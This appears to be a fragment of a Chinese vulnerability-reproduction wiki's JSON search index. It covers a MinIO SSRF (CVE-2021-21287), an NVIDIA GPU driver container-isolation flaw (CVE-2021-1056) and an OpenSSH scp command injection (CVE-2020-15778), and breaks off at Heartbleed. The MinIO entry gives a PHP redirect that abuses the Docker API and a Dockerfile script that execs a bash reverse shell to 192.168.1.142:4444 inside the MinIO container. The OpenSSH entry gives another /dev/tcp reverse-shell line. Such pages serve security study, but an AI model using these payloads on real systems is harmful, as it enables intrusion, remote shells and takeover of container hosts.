\u6240\u4ee5\uff0c\u6211\u5c1d\u8bd5\u7f16\u5199\u4e86\u8fd9\u6837\u4e00\u4e2aDockerfile\uff0c\u770b\u770b\u662f\u5426\u80fd\u591fbuild\u8fd9\u4e2a\u955c\u50cf\uff0c\u5982\u679c\u53ef\u4ee5\uff0c\u90a3\u4e48\u6211\u76844444\u7aef\u53e3\u5e94\u8be5\u80fd\u6536\u5230wget\u7684\u8bf7\u6c42\uff1a FROM alpine:3.13 RUN wget -T4 http://192.168.1.142:4444/docker/build \u7136\u540e\u4fee\u6539\u524d\u9762\u7684index.php\uff0c\u6307\u5411Docker\u96c6\u7fa4\u76842375\u7aef\u53e3\uff1a <?php header('Location: http://192.168.227.131:2375/build?remote=http://192.168.1.142:4443/Dockerfile&nocache=true&t=evil:1', false, 307); \u8fdb\u884cSSRF\u653b\u51fb\uff0c\u7b49\u5f85\u4e86\u4e00\u4f1a\u513f\uff0c\u679c\u7136\u6536\u5230\u8bf7\u6c42\u4e86\uff1a \u5b8c\u7f8e\uff0c\u6211\u4eec\u5df2\u7ecf\u53ef\u4ee5\u5728\u76ee\u6807\u96c6\u7fa4\u5bb9\u5668\u91cc\u6267\u884c\u4efb\u610f\u547d\u4ee4\u4e86\u3002 \u6b64\u65f6\u79bb\u6211\u4eec\u7684\u76ee\u6807\uff0c\u62ff\u4e0bMinIO\uff0c\u8fd8\u5dee\u4e00\u70b9\u70b9\uff0c\u540e\u9762\u7684\u653b\u51fb\u5176\u5b9e\u5c31\u6bd4\u8f83\u7b80\u5355\u4e86\u3002 \u56e0\u4e3a\u73b0\u5728\u53ef\u4ee5\u6267\u884c\u4efb\u610f\u547d\u4ee4\uff0c\u6211\u4eec\u5c31\u4e0d\u4f1a\u518d\u53d7\u5230SSRF\u6f0f\u6d1e\u7684\u9650\u5236\uff0c\u53ef\u4ee5\u76f4\u63a5\u53cd\u5f39\u4e00\u4e2ashell\uff0c\u6216\u8005\u53ef\u4ee5\u76f4\u63a5\u53d1\u9001\u4efb\u610f\u6570\u636e\u5305\u5230Docker API\uff0c\u6765\u8bbf\u95ee\u5bb9\u5668\u3002\u7ecf\u8fc7\u4e00\u987f\u6d4b\u8bd5\uff0c\u6211\u53d1\u73b0MinIO\u867d\u7136\u662f\u8fd0\u884c\u7684\u4e00\u4e2aservice\uff0c\u4f46\u5b9e\u9645\u4e0a\u5c31\u53ea\u6709\u4e00\u4e2a\u5bb9\u5668\u3002 \u6240\u4ee5\u6211\u7f16\u5199\u4e86\u4e00\u4e2a\u81ea\u52a8\u5316\u653b\u51fbMinIO\u5bb9\u5668\u7684\u811a\u672c\uff0c\u5e76\u5c06\u5176\u653e\u5728\u4e86Dockerfile\u4e2d\uff0c\u8ba9\u5176\u5728Build\u7684\u65f6\u5019\u8fdb\u884c\u653b\u51fb\uff0c\u5229\u7528 docker exec \u5728MinIO\u7684\u5bb9\u5668\u91cc\u6267\u884c\u53cd\u5f39shell\u7684\u547d\u4ee4\u3002\u8fd9\u4e2aDockerfile\u5982\u4e0b\uff1a FROM alpine:3.13 RUN apk add curl bash jq RUN set -ex && \\ { \\ echo '#!/bin/bash' ; \\ echo 'set -ex' ; \\ echo 'target=\"http://192.168.227.131:2375\"' ; \\ echo 'jsons=$(curl -s -XGET \"${target}/containers/json\" | jq -r \".[] | @base64\")' ; \\ echo 'for item in ${jsons[@]}; do' ; \\ echo ' name=$(echo $item | base64 -d | jq -r \".Image\")' ; \\ echo ' if [[ \"$name\" == *\"minio/minio\"* ]]; then' ; \\ echo ' id=$(echo $item | base64 -d | jq -r \".Id\")' ; \\ echo ' break' ; \\ echo ' fi' ; \\ echo 'done' ; \\ echo 'execid=$(curl -s -X POST \"${target}/containers/${id}/exec\" -H \"Content-Type: application/json\" --data-binary \"{\\\"Cmd\\\": [\\\"bash\\\", \\\"-c\\\", \\\"bash -i >& /dev/tcp/192.168.1.142/4444 0>&1\\\"]}\" | jq -r \".Id\")' ; \\ echo 'curl -s -X POST \"${target}/exec/${execid}/start\" -H \"Content-Type: application/json\" --data-binary \"{}\"' ; \\ } | bash \u8fd9\u4e2a\u811a\u672c\u6240\u5e72\u7684\u4e8b\u60c5\u6bd4\u8f83\u7b80\u5355\uff0c\u4e00\u4e2a\u662f\u904d\u5386\u4e86\u6240\u6709\u5bb9\u5668\uff0c\u5982\u679c\u53d1\u73b0\u5176\u955c\u50cf\u7684\u540d\u5b57\u4e2d\u5305\u542b minio/minio \uff0c\u5219\u8ba4\u4e3a\u8fd9\u4e2a\u5bb9\u5668\u5c31\u662fMinIO\u6240\u5728\u7684\u5bb9\u5668\u3002\u62ff\u5230\u8fd9\u4e2a\u5bb9\u5668\u7684Id\uff0c\u7528exec\u7684API\uff0c\u5728\u5176\u4e2d\u6267\u884c\u53cd\u5f39shell\u7684\u547d\u4ee4 Youtube \u6f14\u793a\u94fe\u63a5 \u5f53\u7136\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u901a\u8fc7Docker API\u6765\u83b7\u53d6\u96c6\u7fa4\u6743\u9650","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/MinIO/MinIO%20SSRF%E6%BC%8F%E6%B4%9E%20CVE-2021-21287/#\u53c2\u8003\u6587\u7ae0","text":"https://www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/NVIDIA/NVIDIA%20GPU%E6%98%BE%E7%A4%BA%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%20CVE-2021-1056/","text":"NVIDIA GPU\u663e\u793a\u9a71\u52a8\u7a0b\u5e8f \u4fe1\u606f\u6cc4\u9732 CVE-2021-1056 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u7528\u4e8eLinux\u7684NVIDIA GPU\u663e\u793a\u9a71\u52a8\u7a0b\u5e8f\u5728\u5185\u6838\u6a21\u5f0f\u5c42\uff08 nvidia.ko \uff09\u4e2d\u5305\u542b\u4e00\u4e2a\u6f0f\u6d1e\uff0c\u5728\u8be5\u6f0f\u6d1e\u4e2d\uff0c\u5b83\u6ca1\u6709\u5b8c\u5168\u9075\u5b88\u64cd\u4f5c\u7cfb\u7edf\u6587\u4ef6\u7cfb\u7edf\u63d0\u4f9bGPU\u8bbe\u5907\u7ea7\u9694\u79bb\u7684\u6743\u9650\uff0c\u8fd9\u53ef\u80fd\u5bfc\u81f4\u62d2\u7edd\u670d\u52a1\u6216\u4fe1\u606f\u6cc4\u9732\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] NVIDIA GPU\u663e\u793a\u9a71\u52a8\u7a0b\u5e8f \u73af\u5883\u642d\u5efa \u00b6 Dokcer\u7248\u672c: 19.03 git clone https://github.com/pokerfaceSad/CVE-2021-1056.git cd CVE-2021-1056 docker run --gpus 1 -v $PWD:/CVE-2021-1056 -it tensorflow/tensorflow:1.13.2-gpu bash \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u8fdb\u5165\u5bb9\u5668\u68c0\u67e5 GPU\u72b6\u6001\uff0c\u53ea\u6709\u4e00\u5757GPU In Container# nvidia-smi Sat Jan 9 07 :21:03 2021 +-----------------------------------------------------------------------------+ | NVIDIA-SMI 450 .51.05 Driver Version: 450 .51.05 CUDA Version: 11 .0 | | -------------------------------+----------------------+----------------------+ | GPU Name Persistence-M | Bus-Id Disp.A | Volatile Uncorr. ECC | | Fan Temp Perf Pwr:Usage/Cap | Memory-Usage | GPU-Util Compute M. | | | | MIG M. | | =============================== + ====================== + ====================== | | 0 Tesla V100-PCIE... Off | 00000000 :02:00.0 Off | 0 | | N/A 27C P0 23W / 250W | 0MiB / 32510MiB | 0 % Default | | | | N/A | +-------------------------------+----------------------+----------------------+ +-----------------------------------------------------------------------------+ | Processes: | | GPU GI CI PID Type Process name GPU Memory | | ID ID Usage | | ============================================================================= | | No running processes found | +-----------------------------------------------------------------------------+ \u5728\u5bb9\u5668\u4e2d\u6267\u884c\u6f0f\u6d1e\u5229\u7528\u811a\u672c\uff0c\u5728\u6700\u540e\u7684 nvidia-smi \u7684\u8f93\u51fa\u4e2d\u53ef\u4ee5\u770b\u5230\u5bbf\u4e3b\u673a\u6240\u6709GPU\u5728\u5bb9\u5668\u4e2d\u90fd\u5df2\u7ecf\u53ef\u89c1\u4e86 In Container# bash /CVE-2021-1056/main.sh [ INFO ] init GPU num: 1 [ DEBUG ] /dev/nvidia0 exists, skip [ DEBUG ] successfully get /dev/nvidia1 [ DEBUG ] successfully get /dev/nvidia2 [ DEBUG ] successfully get /dev/nvidia3 [ DEBUG ] delete redundant /dev/nvidia4 [ INFO ] get extra 3 GPU devices from host [ INFO ] current GPU num: 4 [ INFO ] exec nvidia-smi: Sat Jan 9 07 :22:43 2021 +-----------------------------------------------------------------------------+ | NVIDIA-SMI 450 .51.05 Driver Version: 450 .51.05 CUDA Version: 11 .0 | | -------------------------------+----------------------+----------------------+ | GPU Name Persistence-M | Bus-Id Disp.A | Volatile Uncorr. ECC | | Fan Temp Perf Pwr:Usage/Cap | Memory-Usage | GPU-Util Compute M. | | | | MIG M. | | =============================== + ====================== + ====================== | | 0 Tesla V100-PCIE... Off | 00000000 :02:00.0 Off | 0 | | N/A 27C P0 23W / 250W | 0MiB / 32510MiB | 0 % Default | | | | N/A | +-------------------------------+----------------------+----------------------+ | 1 Tesla V100-PCIE... Off | 00000000 :03:00.0 Off | 0 | | N/A 30C P0 25W / 250W | 0MiB / 32510MiB | 0 % Default | | | | N/A | +-------------------------------+----------------------+----------------------+ | 2 Tesla V100-PCIE... Off | 00000000 :82:00.0 Off | 0 | | N/A 29C P0 25W / 250W | 0MiB / 32510MiB | 0 % Default | | | | N/A | +-------------------------------+----------------------+----------------------+ | 3 Tesla V100-PCIE... Off | 00000000 :83:00.0 Off | 0 | | N/A 28C P0 25W / 250W | 0MiB / 32510MiB | 0 % Default | | | | N/A | +-------------------------------+----------------------+----------------------+ +-----------------------------------------------------------------------------+ | Processes: | | GPU GI CI PID Type Process name GPU Memory | | ID ID Usage | | ============================================================================= | | No running processes found | +-----------------------------------------------------------------------------+ \u4e3a\u4e86\u9a8c\u8bc1\u8fd9\u4e9bGPU\u786e\u5b9e\u662f\u53ef\u7528\u7684\uff0c\u6267\u884c\u4e00\u4e2atensorflow\u7684demo\uff0c\u53ef\u4ee5\u770b\u5230\u6240\u6709\u7684GPU\u786e\u5b9e\u53ef\u4ee5\u88ab\u5bb9\u5668\u4e2d\u7684\u8fdb\u7a0b\u4f7f\u7528 In Container# nohup python /CVE-2021-1056/tf_distr_demo.py > log 2 > & 1 & In Container$ nvidia-smi Sat Jan 9 18 :58:23 2021 +-----------------------------------------------------------------------------+ | NVIDIA-SMI 450 .51.05 Driver Version: 450 .51.05 CUDA Version: 11 .0 | | -------------------------------+----------------------+----------------------+ | GPU Name Persistence-M | Bus-Id Disp.A | Volatile Uncorr. ECC | | Fan Temp Perf Pwr:Usage/Cap | Memory-Usage | GPU-Util Compute M. | | | | MIG M. | | =============================== + ====================== + ====================== | | 0 Tesla V100-PCIE... Off | 00000000 :02:00.0 Off | 0 | | N/A 32C P0 36W / 250W | 31117MiB / 32510MiB | 1 % Default | | | | N/A | +-------------------------------+----------------------+----------------------+ | 1 Tesla V100-PCIE... Off | 00000000 :03:00.0 Off | 0 | | N/A 33C P0 35W / 250W | 31117MiB / 32510MiB | 1 % Default | | | | N/A | +-------------------------------+----------------------+----------------------+ | 2 Tesla V100-PCIE... Off | 00000000 :82:00.0 Off | 0 | | N/A 33C P0 36W / 250W | 31117MiB / 32510MiB | 1 % Default | | | | N/A | +-------------------------------+----------------------+----------------------+ | 3 Tesla V100-PCIE... Off | 00000000 :83:00.0 Off | 0 | | N/A 32C P0 37W / 250W | 31117MiB / 32510MiB | 1 % Default | | | | N/A | +-------------------------------+----------------------+----------------------+ +-----------------------------------------------------------------------------+ | Processes: | | GPU GI CI PID Type Process name GPU Memory | | ID ID Usage | | ============================================================================= | +-----------------------------------------------------------------------------+ \u53c2\u8003\u6587\u7ae0 \u00b6 https://github.com/pokerfaceSad/CVE-2021-1056/blob/master/docs/QuickStart.md","title":"NVIDIA GPU\u663e\u793a\u9a71\u52a8\u7a0b\u5e8f \u4fe1\u606f\u6cc4\u9732 CVE-2021-1056"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/NVIDIA/NVIDIA%20GPU%E6%98%BE%E7%A4%BA%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%20CVE-2021-1056/#nvidia-gpu\u663e\u793a\u9a71\u52a8\u7a0b\u5e8f-\u4fe1\u606f\u6cc4\u9732-cve-2021-1056","text":"","title":"NVIDIA GPU\u663e\u793a\u9a71\u52a8\u7a0b\u5e8f \u4fe1\u606f\u6cc4\u9732 CVE-2021-1056"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/NVIDIA/NVIDIA%20GPU%E6%98%BE%E7%A4%BA%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%20CVE-2021-1056/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u7528\u4e8eLinux\u7684NVIDIA GPU\u663e\u793a\u9a71\u52a8\u7a0b\u5e8f\u5728\u5185\u6838\u6a21\u5f0f\u5c42\uff08 nvidia.ko \uff09\u4e2d\u5305\u542b\u4e00\u4e2a\u6f0f\u6d1e\uff0c\u5728\u8be5\u6f0f\u6d1e\u4e2d\uff0c\u5b83\u6ca1\u6709\u5b8c\u5168\u9075\u5b88\u64cd\u4f5c\u7cfb\u7edf\u6587\u4ef6\u7cfb\u7edf\u63d0\u4f9bGPU\u8bbe\u5907\u7ea7\u9694\u79bb\u7684\u6743\u9650\uff0c\u8fd9\u53ef\u80fd\u5bfc\u81f4\u62d2\u7edd\u670d\u52a1\u6216\u4fe1\u606f\u6cc4\u9732\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/NVIDIA/NVIDIA%20GPU%E6%98%BE%E7%A4%BA%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%20CVE-2021-1056/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] NVIDIA GPU\u663e\u793a\u9a71\u52a8\u7a0b\u5e8f","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/NVIDIA/NVIDIA%20GPU%E6%98%BE%E7%A4%BA%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%20CVE-2021-1056/#\u73af\u5883\u642d\u5efa","text":"Dokcer\u7248\u672c: 19.03 git clone https://github.com/pokerfaceSad/CVE-2021-1056.git cd CVE-2021-1056 docker run --gpus 1 -v $PWD:/CVE-2021-1056 -it tensorflow/tensorflow:1.13.2-gpu bash","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/NVIDIA/NVIDIA%20GPU%E6%98%BE%E7%A4%BA%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%20CVE-2021-1056/#\u6f0f\u6d1e\u590d\u73b0","text":"\u8fdb\u5165\u5bb9\u5668\u68c0\u67e5 GPU\u72b6\u6001\uff0c\u53ea\u6709\u4e00\u5757GPU In Container# nvidia-smi Sat Jan 9 07 :21:03 2021 +-----------------------------------------------------------------------------+ | NVIDIA-SMI 450 .51.05 Driver Version: 450 .51.05 CUDA Version: 11 .0 | | -------------------------------+----------------------+----------------------+ | GPU Name Persistence-M | Bus-Id Disp.A | Volatile Uncorr. ECC | | Fan Temp Perf Pwr:Usage/Cap | Memory-Usage | GPU-Util Compute M. | | | | MIG M. | | =============================== + ====================== + ====================== | | 0 Tesla V100-PCIE... Off | 00000000 :02:00.0 Off | 0 | | N/A 27C P0 23W / 250W | 0MiB / 32510MiB | 0 % Default | | | | N/A | +-------------------------------+----------------------+----------------------+ +-----------------------------------------------------------------------------+ | Processes: | | GPU GI CI PID Type Process name GPU Memory | | ID ID Usage | | ============================================================================= | | No running processes found | +-----------------------------------------------------------------------------+ \u5728\u5bb9\u5668\u4e2d\u6267\u884c\u6f0f\u6d1e\u5229\u7528\u811a\u672c\uff0c\u5728\u6700\u540e\u7684 nvidia-smi \u7684\u8f93\u51fa\u4e2d\u53ef\u4ee5\u770b\u5230\u5bbf\u4e3b\u673a\u6240\u6709GPU\u5728\u5bb9\u5668\u4e2d\u90fd\u5df2\u7ecf\u53ef\u89c1\u4e86 In Container# bash /CVE-2021-1056/main.sh [ INFO ] init GPU num: 1 [ DEBUG ] /dev/nvidia0 exists, skip [ DEBUG ] successfully get /dev/nvidia1 [ DEBUG ] successfully get /dev/nvidia2 [ DEBUG ] successfully get /dev/nvidia3 [ DEBUG ] delete redundant /dev/nvidia4 [ INFO ] get extra 3 GPU devices from host [ INFO ] current GPU num: 4 [ INFO ] exec nvidia-smi: Sat Jan 9 07 :22:43 2021 +-----------------------------------------------------------------------------+ | NVIDIA-SMI 450 .51.05 Driver Version: 450 .51.05 CUDA Version: 11 .0 | | -------------------------------+----------------------+----------------------+ | GPU Name Persistence-M | Bus-Id Disp.A | Volatile Uncorr. ECC | | Fan Temp Perf Pwr:Usage/Cap | Memory-Usage | GPU-Util Compute M. | | | | MIG M. | | =============================== + ====================== + ====================== | | 0 Tesla V100-PCIE... Off | 00000000 :02:00.0 Off | 0 | | N/A 27C P0 23W / 250W | 0MiB / 32510MiB | 0 % Default | | | | N/A | +-------------------------------+----------------------+----------------------+ | 1 Tesla V100-PCIE... Off | 00000000 :03:00.0 Off | 0 | | N/A 30C P0 25W / 250W | 0MiB / 32510MiB | 0 % Default | | | | N/A | +-------------------------------+----------------------+----------------------+ | 2 Tesla V100-PCIE... Off | 00000000 :82:00.0 Off | 0 | | N/A 29C P0 25W / 250W | 0MiB / 32510MiB | 0 % Default | | | | N/A | +-------------------------------+----------------------+----------------------+ | 3 Tesla V100-PCIE... Off | 00000000 :83:00.0 Off | 0 | | N/A 28C P0 25W / 250W | 0MiB / 32510MiB | 0 % Default | | | | N/A | +-------------------------------+----------------------+----------------------+ +-----------------------------------------------------------------------------+ | Processes: | | GPU GI CI PID Type Process name GPU Memory | | ID ID Usage | | ============================================================================= | | No running processes found | +-----------------------------------------------------------------------------+ \u4e3a\u4e86\u9a8c\u8bc1\u8fd9\u4e9bGPU\u786e\u5b9e\u662f\u53ef\u7528\u7684\uff0c\u6267\u884c\u4e00\u4e2atensorflow\u7684demo\uff0c\u53ef\u4ee5\u770b\u5230\u6240\u6709\u7684GPU\u786e\u5b9e\u53ef\u4ee5\u88ab\u5bb9\u5668\u4e2d\u7684\u8fdb\u7a0b\u4f7f\u7528 In Container# nohup python /CVE-2021-1056/tf_distr_demo.py > log 2 > & 1 & In Container$ nvidia-smi Sat Jan 9 18 :58:23 2021 +-----------------------------------------------------------------------------+ | NVIDIA-SMI 450 .51.05 Driver Version: 450 .51.05 CUDA Version: 11 .0 | | -------------------------------+----------------------+----------------------+ | GPU Name Persistence-M | Bus-Id Disp.A | Volatile Uncorr. ECC | | Fan Temp Perf Pwr:Usage/Cap | Memory-Usage | GPU-Util Compute M. | | | | MIG M. | | =============================== + ====================== + ====================== | | 0 Tesla V100-PCIE... Off | 00000000 :02:00.0 Off | 0 | | N/A 32C P0 36W / 250W | 31117MiB / 32510MiB | 1 % Default | | | | N/A | +-------------------------------+----------------------+----------------------+ | 1 Tesla V100-PCIE... Off | 00000000 :03:00.0 Off | 0 | | N/A 33C P0 35W / 250W | 31117MiB / 32510MiB | 1 % Default | | | | N/A | +-------------------------------+----------------------+----------------------+ | 2 Tesla V100-PCIE... Off | 00000000 :82:00.0 Off | 0 | | N/A 33C P0 36W / 250W | 31117MiB / 32510MiB | 1 % Default | | | | N/A | +-------------------------------+----------------------+----------------------+ | 3 Tesla V100-PCIE... Off | 00000000 :83:00.0 Off | 0 | | N/A 32C P0 37W / 250W | 31117MiB / 32510MiB | 1 % Default | | | | N/A | +-------------------------------+----------------------+----------------------+ +-----------------------------------------------------------------------------+ | Processes: | | GPU GI CI PID Type Process name GPU Memory | | ID ID Usage | | ============================================================================= | +-----------------------------------------------------------------------------+","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/NVIDIA/NVIDIA%20GPU%E6%98%BE%E7%A4%BA%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%20CVE-2021-1056/#\u53c2\u8003\u6587\u7ae0","text":"https://github.com/pokerfaceSad/CVE-2021-1056/blob/master/docs/QuickStart.md","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/OpenSSH/OpenSSH%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2020-15778/","text":"OpenSSH \u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e CVE-2020-15778 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 2020\u5e746\u67089\u65e5\uff0c\u7814\u7a76\u4eba\u5458Chinmay Pandya\u5728Openssh\u4e2d\u53d1\u73b0\u4e86\u4e00\u4e2a\u6f0f\u6d1e\uff0c\u4e8e7\u670818\u65e5\u516c\u5f00\u3002OpenSSH\u76848.3p1\u4e2d\u7684scp\u5141\u8bb8\u5728scp.c\u8fdc\u7a0b\u529f\u80fd\u4e2d\u6ce8\u5165\u547d\u4ee4\uff0c\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002\u76ee\u524d\u7edd\u5927\u591a\u6570linux\u7cfb\u7edf\u53d7\u5f71\u54cd\u3002\u6df1\u4fe1\u670d\u5b89\u5168\u7814\u7a76\u56e2\u961f\u4f9d\u636e\u6f0f\u6d1e\u91cd\u8981\u6027\u548c\u5f71\u54cd\u529b\u8fdb\u884c\u8bc4\u4f30\uff0c\u4f5c\u51fa\u6f0f\u6d1e\u901a\u544a\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] OpenSSH <= 8.3p1 \u6f0f\u6d1e\u590d\u73b0 \u00b6 [!NOTE] \u53ef\u7528\u4e8e\u76ee\u6807\u4e0d\u5141\u8bb8\u8fdc\u7a0b\u767b\u5f55\u4f46SCP\u5f00\u542f\u7684\u60c5\u51b5\u4e0b\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c \u653b\u51fb\u673a\u521b\u5efa peiqi.txt \uff0c\u5229\u7528 scp\u4e0a\u4f20\u6587\u4ef6 \u5230 /tmp \u76ee\u5f55\u4e0b \u6267\u884c\u547d\u4ee4 ping dnslog \u53cd\u5f39shell \u66f4\u6362\u547d\u4ee4\u5373\u53ef /bin/bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/9999 0>&1","title":"OpenSSH \u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e CVE-2020-15778"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/OpenSSH/OpenSSH%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2020-15778/#openssh-\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e-cve-2020-15778","text":"","title":"OpenSSH \u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e CVE-2020-15778"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/OpenSSH/OpenSSH%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2020-15778/#\u6f0f\u6d1e\u63cf\u8ff0","text":"2020\u5e746\u67089\u65e5\uff0c\u7814\u7a76\u4eba\u5458Chinmay Pandya\u5728Openssh\u4e2d\u53d1\u73b0\u4e86\u4e00\u4e2a\u6f0f\u6d1e\uff0c\u4e8e7\u670818\u65e5\u516c\u5f00\u3002OpenSSH\u76848.3p1\u4e2d\u7684scp\u5141\u8bb8\u5728scp.c\u8fdc\u7a0b\u529f\u80fd\u4e2d\u6ce8\u5165\u547d\u4ee4\uff0c\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002\u76ee\u524d\u7edd\u5927\u591a\u6570linux\u7cfb\u7edf\u53d7\u5f71\u54cd\u3002\u6df1\u4fe1\u670d\u5b89\u5168\u7814\u7a76\u56e2\u961f\u4f9d\u636e\u6f0f\u6d1e\u91cd\u8981\u6027\u548c\u5f71\u54cd\u529b\u8fdb\u884c\u8bc4\u4f30\uff0c\u4f5c\u51fa\u6f0f\u6d1e\u901a\u544a\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/OpenSSH/OpenSSH%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2020-15778/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] OpenSSH <= 8.3p1","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/OpenSSH/OpenSSH%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2020-15778/#\u6f0f\u6d1e\u590d\u73b0","text":"[!NOTE] \u53ef\u7528\u4e8e\u76ee\u6807\u4e0d\u5141\u8bb8\u8fdc\u7a0b\u767b\u5f55\u4f46SCP\u5f00\u542f\u7684\u60c5\u51b5\u4e0b\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c \u653b\u51fb\u673a\u521b\u5efa peiqi.txt \uff0c\u5229\u7528 scp\u4e0a\u4f20\u6587\u4ef6 \u5230 /tmp \u76ee\u5f55\u4e0b \u6267\u884c\u547d\u4ee4 ping dnslog \u53cd\u5f39shell \u66f4\u6362\u547d\u4ee4\u5373\u53ef /bin/bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/9999 0>&1","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/OpenSSL/OpenSSL%20%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E%20CVE-2014-0160/","text":"OpenSSL \u5fc3\u810f\u6ef4\u8840\u6f0f\u6d1e CVE-2014-0160 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 2014\u5e744\u67087\u65e5\uff0cOpenSSL\u53d1\u5e03\u5b89\u5168\u516c\u544a\uff0c\u5728OpenSSL1.0.1\u7248\u672c\u81f3OpenSSL1.0.1f 